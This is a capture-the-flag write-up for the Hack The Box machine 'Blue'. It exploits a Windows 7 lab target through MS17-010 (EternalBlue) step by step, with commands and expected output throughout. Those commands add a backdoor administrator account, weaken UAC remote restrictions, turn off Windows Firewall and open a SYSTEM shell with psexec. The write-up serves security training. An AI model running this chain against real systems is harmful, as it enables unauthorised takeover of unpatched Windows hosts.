# HTB Blue — Writeup
**OS:** Windows 7 Professional SP1  
**Difficulty:** Easy  
**Attack Vector:** MS17-010 (EternalBlue)  
**System:** Arch Linux  

---

## Summary

Blue is a Windows 7 machine vulnerable to MS17-010 (EternalBlue), a critical SMBv1 remote code execution vulnerability. Exploitation grants immediate `NT AUTHORITY\SYSTEM` access with no privilege escalation required.

---

## Reconnaissance

### Port Scan
```bash
nmap -sV -sC -p- --min-rate 5000 <target_ip>
```

Key open ports:
- `139/tcp` — NetBIOS
- `445/tcp` — SMB (primary target)

### Vulnerability Check
```bash
nmap -p 445 --script vuln <target_ip>
```

Output confirms:
```
smb-vuln-ms17-010: VULNERABLE
Remote Code Execution vulnerability in Microsoft SMBv1 servers
```

---

## Setup — Arch Linux

### Install Dependencies

impacket is in the official Arch repos — no AUR needed:
```bash
sudo pacman -S impacket
```

Grab the named pipes wordlist so EternalBlue checkers work properly:
```bash
sudo mkdir -p /usr/share/metasploit-framework/data/wordlists/
sudo curl -o /usr/share/metasploit-framework/data/wordlists/named_pipes.txt \
  https://raw.githubusercontent.com/rapid7/metasploit-framework/master/data/wordlists/named_pipes.txt
```

### Confirm Target is Vulnerable
```bash
python eternal_checker.py <target_ip>
```

Expected output:
```
[*] Target OS: Windows 7 Professional 7601 Service Pack 1
[!] The target is not patched
```

---

## Exploitation

### Step 1 — Create an Admin User via EternalBlue Command Execution

Using Metasploit's command execution auxiliary module with guest credentials:

```bash
msfconsole -q
use auxiliary/admin/smb/ms17_010_command
set RHOSTS <target_ip>
set SMBUser guest
set SMBPass ""
set COMMAND 'net user hacker Password123! /add && net localgroup administrators hacker /add'
run
```

Expected output:
```
[+] Overwrite complete... SYSTEM session obtained!
[+] Command completed successfully!
Output: The command completed successfully.
```

### Step 2 — Disable UAC Remote Restriction

```bash
set COMMAND 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f'
run
```

Expected output:
```
The operation completed successfully.
```

### Step 3 — Disable Windows Firewall

```bash
set COMMAND 'netsh advfirewall set allprofiles state off'
run
```

Expected output:
```
Ok.
```

### Step 4 — Get a SYSTEM Shell via Impacket psexec

> **Arch Linux gotcha:** Your shell may pick up the old Python 2 version from `~/.local/bin`. Always call it with `python3` explicitly.

```bash
python3 /usr/bin/psexec.py hacker:Password123!@<target_ip>
```

Expected output:
```
[*] Found writable share ADMIN$
[*] Uploading file <random>.exe
[*] Creating service on <target>
[*] Starting service...
Microsoft Windows [Version 6.1.7601]
C:\Windows\system32>
```

---

## Flags

```cmd
whoami
# nt authority\system

type C:\Users\haris\Desktop\user.txt
type C:\Users\Administrator\Desktop\root.txt
```

---

## Arch Linux Gotchas & Lessons Learned

| Problem | Fix |
|---|---|
| `impacket-psexec` command not found | Use `python3 /usr/bin/psexec.py` instead |
| `ModuleNotFoundError: impacket` in venv | venv uses Python 3, but impacket was installed under Python 2 — run `pip install impacket` inside the activated venv |
| Named pipes wordlist missing | `sudo curl` the file from the Metasploit GitHub repo directly |
| No AUR needed for impacket | `sudo pacman -S impacket` works out of the box |
| MSF payloads timing out | Windows Firewall blocking callbacks — disable it first via command module |
| psexec STATUS_ACCESS_DENIED | UAC token filter blocking remote admin — fix with `LocalAccountTokenFilterPolicy` registry key |
| Shared HTB machine thrashed | Other players corrupt the box — reset and move fast, or get VIP for dedicated instances |

---

## Tools Used

- `nmap` — reconnaissance and vuln scanning
- `metasploit` (`auxiliary/admin/smb/ms17_010_command`) — EternalBlue command execution
- `impacket` (`psexec.py`) — shell via SMB

---

*Rooted after a long battle on Arch Linux. Sometimes the path is the lesson.* 🏆
